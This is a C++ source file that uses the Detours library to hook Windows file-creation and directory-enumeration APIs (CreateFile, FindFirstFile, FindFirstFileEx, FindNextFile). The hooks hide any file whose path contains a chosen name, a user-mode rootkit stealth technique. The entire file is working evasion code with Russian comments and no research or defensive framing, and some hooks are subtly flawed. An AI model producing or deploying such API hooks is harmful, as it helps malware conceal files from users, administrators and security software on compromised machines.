#include "Hide.h"

string file_name;
wstring w_file_name;

/*------------------Set_the_pointers_equal_to_the_functions------------------*/
HANDLE(WINAPI* pCreateFileA) (LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile) = CreateFileA;
HANDLE(WINAPI* pCreateFileW) (LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile) = CreateFileW;
HANDLE(WINAPI* pFindFirstFileW) (LPCWSTR lpFileName, LPWIN32_FIND_DATA lpFindFileData) = FindFirstFileW;
HANDLE(WINAPI* pFindFirstFileA)(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData) = FindFirstFileA;
BOOL(WINAPI* pFindNextFileW) (HANDLE hFindFile, LPWIN32_FIND_DATA lpFindFileData) = FindNextFileW;
BOOL(WINAPI* pFindNextFileA) (HANDLE hFindFile, LPWIN32_FIND_DATAA  lpFindFileData) = FindNextFileA;
HANDLE(WINAPI* pFindFirstFileExA) (LPCSTR lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFindFileData, FINDEX_SEARCH_OPS  fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags) = FindFirstFileExA;
HANDLE(WINAPI* pFindFirstFileExW) (LPCWSTR lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFindFileData, FINDEX_SEARCH_OPS  fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags) = FindFirstFileExW;

/*------------------Замена_CreateFileA------------------*/
HANDLE WINAPI MyCreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
{
	if (std::strstr(lpFileName, file_name.c_str()) != NULL) 
	{
		return INVALID_HANDLE_VALUE;
	}
	return pCreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
}

/*------------------Замена_FindFirstFileA------------------*/
HANDLE WINAPI MyFindFirstFileA(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData)
{
	if (std::strstr(lpFileName, file_name.c_str()) != NULL)
	{
		return INVALID_HANDLE_VALUE;
	}
	return pFindFirstFileA(lpFileName, lpFindFileData);
}

/*------------------Замена_FindNextFileA------------------*/
BOOL WINAPI MyFindNextFileA(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData)
{
	bool result = pFindNextFileA(hFindFile, lpFindFileData);
	if (strstr(lpFindFileData->cFileName, file_name.c_str()) != NULL)
	{
		result = pFindNextFileA(hFindFile, lpFindFileData);
	}
	return result;
}

/*------------------Замена_FindFirstFileExA------------------*/
HANDLE MyFindFirstFileExA(LPCSTR lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPWIN32_FIND_DATAA lpFindFileData, FINDEX_SEARCH_OPS fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags)
{
	HANDLE result = pFindFirstFileExA(lpFileName, fInfoLevelId, lpFindFileData, fSearchOp, lpSearchFilter, dwAdditionalFlags);
	if (strstr(lpFindFileData->cFileName, file_name.c_str()) != NULL)
	{
		result = INVALID_HANDLE_VALUE;
	}
	return result;
}

/*------------------Замена_CreateFileW------------------*/
HANDLE WINAPI MyCreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
{
	if (wcsstr(lpFileName, w_file_name.c_str()) != NULL)
	{
		return INVALID_HANDLE_VALUE;
	}
	return pCreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
}

/*------------------Замена_FindFirstFileW------------------*/
HANDLE WINAPI MyFindFirstFileW(LPCWSTR lpFileName, LPWIN32_FIND_DATA lpFindFileData)
{
	if (wcsstr(lpFileName, w_file_name.c_str()) != NULL)
	{
		return INVALID_HANDLE_VALUE;
	}
	return pFindFirstFileW(lpFileName, lpFindFileData);
}

/*------------------Замена_FindNextFileW------------------*/
BOOL WINAPI MyFindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData)
{
	bool result = pFindNextFileW(hFindFile, lpFindFileData);
	if (wcsstr(lpFindFileData->cFileName, w_file_name.c_str()) != NULL)
	{
		result = pFindNextFileW(hFindFile, lpFindFileData);
	}
	return result;
}

/*------------------Замена_FindFirstFileExW------------------*/
HANDLE MyFindFirstFileExW(LPCWSTR lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPWIN32_FIND_DATAW lpFindFileData, FINDEX_SEARCH_OPS fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags)
{
	HANDLE result = pFindFirstFileExW(lpFileName, fInfoLevelId, lpFindFileData, fSearchOp, lpSearchFilter, dwAdditionalFlags);
	if (wcsstr(lpFindFileData->cFileName, w_file_name.c_str()) != NULL)
	{
		result = INVALID_HANDLE_VALUE;
	}
	return result;
}

/*------------------Сокрытие_файла------------------*/
bool Hide::HideFile()
{
	file_name = File_Name;
	w_file_name = wstring(file_name.begin(), file_name.end());
	// Detour CreateFileA to MyCreateFileA
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(PVOID&)pCreateFileA, MyCreateFileA);
	if (DetourTransactionCommit() != NO_ERROR)
		return false;
	// Detour FindFirstFileA to MyFindFirstFileA
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(PVOID&)pFindFirstFileA, MyFindFirstFileA);
	if (DetourTransactionCommit() != NO_ERROR)
		return false;
	// Detour FindNextFileA to MyFindNextFileA
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(PVOID&)pFindNextFileA, MyFindNextFileA);
	if (DetourTransactionCommit() != NO_ERROR)
		return false;
	// Detour FindFirstFileExA to MyFindFirstFileExA
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(PVOID&)pFindFirstFileExA, MyFindFirstFileExA);
	if (DetourTransactionCommit() != NO_ERROR)
		return false;
	// Detour CreateFileW to MyCreateFileW
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(PVOID&)pCreateFileW, MyCreateFileW);
	if (DetourTransactionCommit() != NO_ERROR)
		return false;
	// Detour FindFirstFileW to MyFindFirstFileW
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(PVOID&)pFindFirstFileW, MyFindFirstFileW);
	if (DetourTransactionCommit() != NO_ERROR)
		return false;
	// Detour FindNextFileW to MyFindNextFileW
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(PVOID&)pFindNextFileW, MyFindNextFileW);
	if (DetourTransactionCommit() != NO_ERROR)
		return false;
	// Detour FindFirstFileExW to MyFindFirstFileExW
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(PVOID&)pFindFirstFileExW, MyFindFirstFileExW);
	if (DetourTransactionCommit() != NO_ERROR)
		return false;
	// Если все впорядке и все прошло успешно, то true
	return true;
}

Hide::Hide(string& FileName)
{
	File_Name = FileName;
}

Hide::~Hide()
{
}